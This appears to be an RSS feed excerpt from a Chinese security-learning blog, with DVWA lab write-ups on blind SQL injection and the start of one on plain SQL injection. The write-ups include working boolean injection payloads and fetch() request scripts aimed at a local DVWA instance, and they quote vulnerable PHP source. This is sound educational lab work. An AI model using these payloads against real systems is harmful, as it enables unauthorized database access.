<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>weakptr's 笔记</title><link>https://nnnewb.github.io/blog/</link><description>Recent content on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 28 Apr 2022 11:30:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-SQL盲注</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</link><pubDate>Thu, 28 Apr 2022 11:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>SQL盲注会比一般的注入难度高很多，特别是经验不足的时候可以尝试的 payload 有限，就算有注入点也很难靠手里积累的那点 payload 测出来。一般这种时候用工具会好得多。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>SQL盲注指的是存在SQL注入，但SQL错误不回显。这种情况下报错攻击无效而且构造有效的 payload 会比较困难。但还是可以通过几个方面确定执行结果：&lt;/p>
&lt;ol>
&lt;li>页面显示内容。比如当SQL错误发生或&lt;code>WHERE&lt;/code>、&lt;code>ON&lt;/code>这样的条件子句不满足时和正常执行时网页内容不同。&lt;/li>
&lt;li>如果正常执行和错误都返回一样的页面，还可以通过时间来判断SQL是否被执行，比如构造一个执行很慢的 payload 让 SQL 服务器跑，如果返回时间比正常时间久就说明SQL被执行了。&lt;/li>
&lt;li>可能还有其他的？&lt;/li>
&lt;/ol>
&lt;p>盲注还有个问题就是注入的查询可能不回显到前端，所以直接 &lt;code>UNION&lt;/code> 一个查询曝出所有的表和列是不太可能的。但如果存在盲注的话至少会有一个比特的观测窗口，所以还是存在一个字符一个字符试过去的办法，比如表名第一个字符是&lt;code>a&lt;/code>的表是否存在，表名第一个字符是&lt;code>b&lt;/code>的表是否存在，如此如此。虽然慢而且对一些无法枚举的字段（比如存的是unicode，那总不能遍历整个码表；或者 &lt;code>int&lt;/code>、&lt;code>float&lt;/code>这样取值范围太大的类型）没辙。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low难度收集信息">Low难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250.png"
width="680"
height="263"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250_hu68e498a1133389b005a60b1455865bff_21821_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250_hu68e498a1133389b005a60b1455865bff_21821_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165553250"
class="gallery-image"
data-flex-grow="258"
data-flex-basis="620px"
>&lt;/p>
&lt;p>一个普通表单，尝试输入数字。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795.png"
width="308"
height="116"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795_hu7dd84795174df6ca381a743739fa4e6f_2858_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795_hu7dd84795174df6ca381a743739fa4e6f_2858_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165613795"
class="gallery-image"
data-flex-grow="265"
data-flex-basis="637px"
>&lt;/p>
&lt;p>逻辑应该是检测这个用户id是否存在于数据库中，随便乱打个数字看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361.png"
width="631"
height="280"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361_hud0ddf149c67d609f3993862f6211fe66_22979_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361_hud0ddf149c67d609f3993862f6211fe66_22979_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165723361"
class="gallery-image"
data-flex-grow="225"
data-flex-basis="540px"
>&lt;/p>
&lt;p>看下目标是什么。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902.png"
width="455"
height="90"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902_hu54a233f6dacf4b2d5441110f27ac7522_3798_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902_hu54a233f6dacf4b2d5441110f27ac7522_3798_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165744902"
class="gallery-image"
data-flex-grow="505"
data-flex-basis="1213px"
>&lt;/p>
&lt;p>猜解数据库版本。接着试一试是什么类型的注入，已知这个表单回显是存在/不存在，所以拼一个 &lt;code>' or 1=1; --&lt;/code> 看看，把条件变成恒真。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690.png"
width="503"
height="157"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690_hud319f5e9c130be7012bdc27ceda0d782_8803_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690_hud319f5e9c130be7012bdc27ceda0d782_8803_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165955690"
class="gallery-image"
data-flex-grow="320"
data-flex-basis="768px"
>&lt;/p>
&lt;p>有效。&lt;/p>
&lt;h3 id="low难度解题">Low难度：解题&lt;/h3>
&lt;p>用 &lt;code>or&lt;/code> 连接一个子查询，&lt;code>SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE '5%'); --&lt;/code>。这个查询会判断是MySQL的版本是不是5开头。依次类推很快就能解出MySQL版本号。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE &amp;#39;5%&amp;#39;)); --
&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是很快发现行不通，因为没有权限访问 &lt;code>sys&lt;/code> 这个系统库（没有报错，我只能猜是这样）。&lt;/p>
&lt;p>想了想再谷歌了一下盲注的payloads之后还行没什么头绪，&lt;code>union&lt;/code>大概是不行的，因为回显只有exists和missing两种状态，union查出来也看不到。再翻了一下怎么用SQL查询MySQL版本之后发现除了&lt;code>show variables&lt;/code>和&lt;code>sys.version&lt;/code>之外，还可以试试&lt;code>version&lt;/code>函数。用&lt;code>SELECT SUBSTR(VERSION(),1,1)='5'&lt;/code>，然后逐个位判断（最好是先判断出这个字符串长度，用&lt;code>length(version())&amp;gt;1&lt;/code>这样的 payload。）&lt;/p>
&lt;p>于是做出下面一系列payload（mysql版本号是&lt;code>x.y.z&lt;/code>格式，肯定不低于5位，直接从5开始判断）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT LENGTH(VERSION())&amp;gt;5); -- true
&amp;#39; or (SELECT LENGTH(VERSION())&amp;gt;6); -- false
&lt;/code>&lt;/pre>&lt;/div>&lt;p>只用了两个 payload 就确定了长度是 6。&lt;/p>
&lt;p>接着判断第一位是不是5（因为5.x还是最常用的MySQL版本），后面逐位判断。（这里略了尝试的部分）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT SUBSTR(VERSION(),1,1)=&amp;#39;5&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),2,1)=&amp;#39;.&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),3,1)=&amp;#39;7&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),4,1)=&amp;#39;.&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),5,1)=&amp;#39;3&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),6,1)=&amp;#39;7&amp;#39;); -- true
&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以数据库版本号是 &lt;code>5.7.37&lt;/code>。&lt;/p>
&lt;p>这种无聊的爆破工作显然是应该交给脚本的。之后研究sqlmap的时候会再回头看看怎么用sqlmap盲注这里。&lt;/p>
&lt;h3 id="medium难度收集信息">Medium难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212.png"
width="676"
height="262"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212_hudf0870afea0dcfc1e3e4109bbd719b87_21982_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212_hudf0870afea0dcfc1e3e4109bbd719b87_21982_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428092639212"
class="gallery-image"
data-flex-grow="258"
data-flex-basis="619px"
>&lt;/p>
&lt;p>和SQL注入题的medium难度一模一样。&lt;/p>
&lt;h3 id="medium难度解题">Medium难度：解题&lt;/h3>
&lt;p>还是老样子，复制出请求，尝试提交个数字型注入。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-user&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;referrerPolicy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=999+or+1%3D1;+--+&amp;amp;Submit=Submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875.png"
width="275"
height="127"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875_hue3004388d8f7ebb1b8e1a4e7c063a876_6853_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875_hue3004388d8f7ebb1b8e1a4e7c063a876_6853_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428092945875"
class="gallery-image"
data-flex-grow="216"
data-flex-basis="519px"
>&lt;/p>
&lt;p>在&lt;code>id=999 or 1=1; --&lt;/code>这个payload下返回了 &lt;code>exists&lt;/code>，剩下的就是和 Low 难度差不多的方式爆破出版本号，就不复述了。&lt;/p>
&lt;h3 id="high难度收集信息">High难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965.png"
width="322"
height="226"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965_hua6d17fe928e830e032cdd493fe5241e6_10316_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965_hua6d17fe928e830e032cdd493fe5241e6_10316_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428093304965"
class="gallery-image"
data-flex-grow="142"
data-flex-basis="341px"
>&lt;/p>
&lt;p>和SQL注入题的High难度差不多，但注意到题中提示变成了 &lt;code>Cookie ID set!&lt;/code>，于是看一眼 Cookie。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840.png"
width="462"
height="57"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840_huafac5c1c1ab8d99e6aa0d3cebbb5bbd0_4571_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840_huafac5c1c1ab8d99e6aa0d3cebbb5bbd0_4571_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428093423840"
class="gallery-image"
data-flex-grow="810"
data-flex-basis="1945px"
>&lt;/p>
&lt;p>id直接保存在cookies里，这就简单多了。&lt;/p>
&lt;h3 id="high难度解题">High难度：解题&lt;/h3>
&lt;p>复制出请求（注意复制出 NodeJS fetch，复制浏览器 fetch 不会复制出cookie），把cookie里的id改成&lt;code>0 or 1=1 --&lt;/code>，URL编码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">let&lt;/span> &lt;span class="nx">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cookie&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=0 or 1=1 -- ; PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=high&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Referrer-Policy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;GET&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>初始化一个node包（&lt;code>package.json&lt;/code>把&lt;code>type&lt;/code>设置成&lt;code>module&lt;/code>），安装&lt;code>node-fetch&lt;/code>，补个 &lt;code>import fetch from &amp;quot;node-fetch&amp;quot;;&lt;/code> 然后调试上面的脚本，发现提示 MISSING。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913.png"
width="398"
height="74"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913_huf62e30a3957d9ddbae2f6500df0b0dd5_6114_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913_huf62e30a3957d9ddbae2f6500df0b0dd5_6114_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428095318913"
class="gallery-image"
data-flex-grow="537"
data-flex-basis="1290px"
>&lt;/p>
&lt;p>难道是字符型注入？改成&lt;code>' or 1=1 --&lt;/code>再试一次。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005.png"
width="381"
height="67"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005_hu206a8a9164fccec6065813bd0974fd58_8234_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005_hu206a8a9164fccec6065813bd0974fd58_8234_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428095720005"
class="gallery-image"
data-flex-grow="568"
data-flex-basis="1364px"
>&lt;/p>
&lt;p>这次提示变成了exists，所以是字符型注入。接下来就是用 Low 难度的 Payload 一个一个试过去，爆破出版本号。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>说说我打完盲注的想法。其实最大的问题是没信心，不知道到底什么结果，没有任何错误提示。有源码的情况下白盒还比较容易构造 payload，黑盒的情况下盲注构造payload倒是很考验心态，因为总是不成功没反应打击很大，会怀疑是不是自己判断错了。&lt;/p>
&lt;p>而且很费时间。&lt;/p>
&lt;p>想确认是否有注入点感觉最好的办法还是先拿工具脚本试水。不过有防火墙的情况下可能又有问题=。=像是&lt;code>or 1=1&lt;/code>这种payload很可能被杀。工具没辙的时候还得看人有没有新点子，但这又是大佬的领域了&amp;hellip;&lt;/p>
&lt;p>嗯，我也想做大佬啊。&lt;/p></description></item><item><title>DVWA上手记录-SQL注入</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</link><pubDate>Wed, 27 Apr 2022 15:43:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>拼字符串，和命令注入原理一样。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>Low难度下SQL注入是一个简单的表单。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135511588.png"
width="554"
height="260"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135511588_hub07b0edd99b217881ccdcccc18c385fd_19797_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135511588_hub07b0edd99b217881ccdcccc18c385fd_19797_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135511588"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="511px"
>&lt;/p>
&lt;p>随便提交什么东西注意到地址栏变化。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135532773.png"
width="496"
height="59"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135532773_hu6a0da43ddc23bfb6af10f644ca1b64bf_5365_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135532773_hu6a0da43ddc23bfb6af10f644ca1b64bf_5365_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135532773"
class="gallery-image"
data-flex-grow="840"
data-flex-basis="2017px"
>&lt;/p>
&lt;p>尝试提高难度继续观察。Medium难度下表单如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135617461.png"
width="371"
height="178"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135617461_hu0a9dfdf5ac88fb9daf47e4f628f987f7_7860_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135617461_hu0a9dfdf5ac88fb9daf47e4f628f987f7_7860_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135617461"
class="gallery-image"
data-flex-grow="208"
data-flex-basis="500px"
>&lt;/p>
&lt;p>High难度表单如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135110188.png"
width="724"
height="444"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135110188_hu0cff8eb887f9a62e6151f779494ecc79_46075_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135110188_hu0cff8eb887f9a62e6151f779494ecc79_46075_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135110188"
class="gallery-image"
data-flex-grow="163"
data-flex-basis="391px"
>&lt;/p>
&lt;p>任务是窃取用户1~5的密码。&lt;/p>
&lt;h3 id="low-难度">Low 难度&lt;/h3>
&lt;p>手工注入，先尝试用经典的&lt;code>'&lt;/code>来检测。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135902575.png"
width="1074"
height="96"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135902575_hud9bcdfead344ebea607c929391fabaf7_9497_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135902575_hud9bcdfead344ebea607c929391fabaf7_9497_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135902575"
class="gallery-image"
data-flex-grow="1118"
data-flex-basis="2685px"
>&lt;/p>
&lt;p>存在注入。比较菜，继续前先看看源码再决定用什么 payload。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_DVWA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SQLI_DB&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">MYSQL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// Check database
